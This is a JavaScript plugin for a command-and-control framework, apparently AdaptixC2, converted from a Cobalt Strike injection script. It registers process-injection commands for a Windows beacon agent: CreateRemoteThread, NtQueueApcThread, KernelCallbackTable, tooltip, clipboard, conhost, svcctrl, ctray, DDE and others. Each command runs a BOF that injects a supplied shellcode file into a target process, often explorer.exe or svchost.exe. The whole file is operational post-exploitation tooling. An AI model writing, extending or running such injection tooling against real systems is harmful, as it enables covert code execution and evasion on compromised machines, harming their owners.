var metadata = {
    name: "cs_remote_ops_injection",
    description: "CS Remote OPs BOF - Injection Techniques (converted from Injection.cna)"
};

function bofPath(agentId, name) {
    return ax.script_dir() + name + "/" + name + "." + ax.arch(agentId) + ".o";
}

// ========================================
// PID + Shellcode Injection Commands
// ========================================

var injectionCmds = [];

var pidShellcodeInjections = [
    {
        name: "createremotethread",
        desc: "createremotethread injection technique",
        usage: "createremotethread <PID> <SHELLCODE>",
        task: "Task: inject shellcode via CreateRemoteThread",
        help: "Injects shellcode into a process using the createremotethread technique."
    },
    {
        name: "setthreadcontext",
        desc: "setthreadcontext injection technique",
        usage: "setthreadcontext <PID> <SHELLCODE>",
        task: "Task: inject shellcode via SetThreadContext",
        help: "Injects shellcode into a process using the setthreadcontext technique."
    },
    {
        name: "ntcreatethread",
        desc: "ntcreatethread injection technique",
        usage: "ntcreatethread <PID> <SHELLCODE>",
        task: "Task: inject shellcode via NtCreateThread",
        help: "Injects shellcode using NtCreateThread with syscalls loaded from ntdll on disk."
    },
    {
        name: "ntqueueapcthread",
        desc: "ntqueueapcthread injection technique",
        usage: "ntqueueapcthread <PID> <SHELLCODE>",
        task: "Task: inject shellcode via NtQueueApcThread",
        help: "Injects shellcode using NtQueueApcThread with syscalls loaded from ntdll on disk."
    },
    {
        name: "kernelcallbacktable",
        desc: "kernelcallbacktable injection technique",
        usage: "kernelcallbacktable <PID> <SHELLCODE>",
        task: "Task: inject shellcode via KernelCallbackTable",
        help: "Injects shellcode using the kernelcallbacktable technique. Can only target processes which handle window messages (GUIs)."
    },
    {
        name: "tooltip",
        desc: "tooltip injection technique",
        usage: "tooltip <PID> <SHELLCODE>",
        task: "Task: inject shellcode via Tooltip",
        help: "Injects shellcode using the tooltip technique. Can only target processes with windows that have tooltips, e.g., explorer.exe."
    },
    {
        name: "clipboardinject",
        desc: "clipboardinject injection technique",
        usage: "clipboardinject <PID> <SHELLCODE>",
        task: "Task: inject shellcode via Clipboard",
        help: "Injects shellcode using the clipboardinject technique. Can target explorer.exe, vmtoolsd.exe, or clipboard svchost."
    },
    {
        name: "conhost",
        desc: "conhost injection technique (targets conhost.exe only)",
        usage: "conhost <PID> <SHELLCODE>",
        task: "Task: inject shellcode via Conhost",
        help: "Injects shellcode using the conhost technique. Can only target console applications with a conhost.exe child process."
    },
    {
        name: "svcctrl",
        desc: "svcctrl injection technique",
        usage: "svcctrl <PID> <SHELLCODE>",
        task: "Task: inject shellcode via SvcCtrl",
        help: "Injects shellcode by overwriting a service's internal dispatch table. Target must be hosting services (e.g., svchost.exe, spoolsrv.exe)."
    }
];

pidShellcodeInjections.forEach(function(inj) {
    var cmd = ax.create_command(inj.name, inj.desc, inj.usage, inj.task);
    cmd.addArgInt("pid", true, "PID to inject into");
    cmd.addArgFile("shellcode", false, "Shellcode file to inject");

    cmd.setPreHook(function(agentId, cmdline, parsed_json) {
        var pid = parsed_json["pid"];
        if (pid < 0 || pid > 65535) {
            ax.console_message(agentId, 6, "Invalid PID");
            return;
        }
        var path = bofPath(agentId, inj.name);
        var args = ax.bof_pack("int,bytes", [pid, ax.file_read(parsed_json["shellcode"])]);
        if (inj.name === "svcctrl") {
            ax.console_message(agentId, 5, "Note: may require SeDebugPrivilege");
        }
        ax.execute_alias(agentId, cmdline, "execute bof " + path + " " + args);
    });

    injectionCmds.push(cmd);
});

// ========================================
// Shellcode-Only Injection Commands (no PID)
// ========================================

var shellcodeOnlyInjections = [
    {
        name: "uxsubclassinfo",
        desc: "uxsubclassinfo injection technique (targets explorer.exe only)",
        usage: "uxsubclassinfo <SHELLCODE>",
        task: "Task: inject shellcode via UxSubclassInfo into explorer.exe",
        help: "Injects shellcode into explorer.exe using UxSubclassInfo. No PID needed."
    },
    {
        name: "ctray",
        desc: "ctray injection technique (targets explorer.exe only)",
        usage: "ctray <SHELLCODE>",
        task: "Task: inject shellcode via CTray into explorer.exe",
        help: "Injects shellcode into explorer.exe using the ctray technique. No PID needed."
    },
    {
        name: "dde",
        desc: "dde injection technique (targets explorer.exe only)",
        usage: "dde <SHELLCODE>",
        task: "Task: inject shellcode via DDE into explorer.exe",
        help: "Injects shellcode into explorer.exe using the DDE technique. WARNING: shellcode executes FOUR times."
    }
];

shellcodeOnlyInjections.forEach(function(inj) {
    var cmd = ax.create_command(inj.name, inj.desc, inj.usage, inj.task);
    cmd.addArgFile("shellcode", false, "Shellcode file to inject");

    cmd.setPreHook(function(agentId, cmdline, parsed_json) {
        var path = bofPath(agentId, inj.name);
        var args = ax.bof_pack("bytes", [ax.file_read(parsed_json["shellcode"])]);
        ax.execute_alias(agentId, cmdline, "execute bof " + path + " " + args);
    });

    injectionCmds.push(cmd);
});

var group = ax.create_commands_group("Injection BOFs", injectionCmds);
ax.register_commands_group(group, ["beacon"], ["windows"], []);
